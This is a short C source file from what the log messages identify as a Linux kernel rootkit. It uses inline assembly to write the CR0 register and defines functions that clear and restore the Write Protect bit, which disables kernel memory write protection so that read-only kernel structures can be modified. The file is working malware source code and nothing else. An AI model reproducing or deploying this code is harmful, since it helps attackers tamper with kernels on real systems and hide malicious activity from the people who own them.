#include "memory_prot.h"

inline void force_write_cr0(unsigned long val) {
        asm volatile(
        "mov %0, %%cr0"
        : "+r"(val)
        );
}

void enable_memory_protection(void) {
        force_write_cr0(read_cr0() | (0x10000));
        printk(KERN_INFO "rootkit: Memory protection enabled.\n");
}

void disable_memory_protection(void) {
        force_write_cr0(read_cr0() & (~0x10000));
        printk(KERN_INFO "rootkit: Memory protection disabled.\n");
}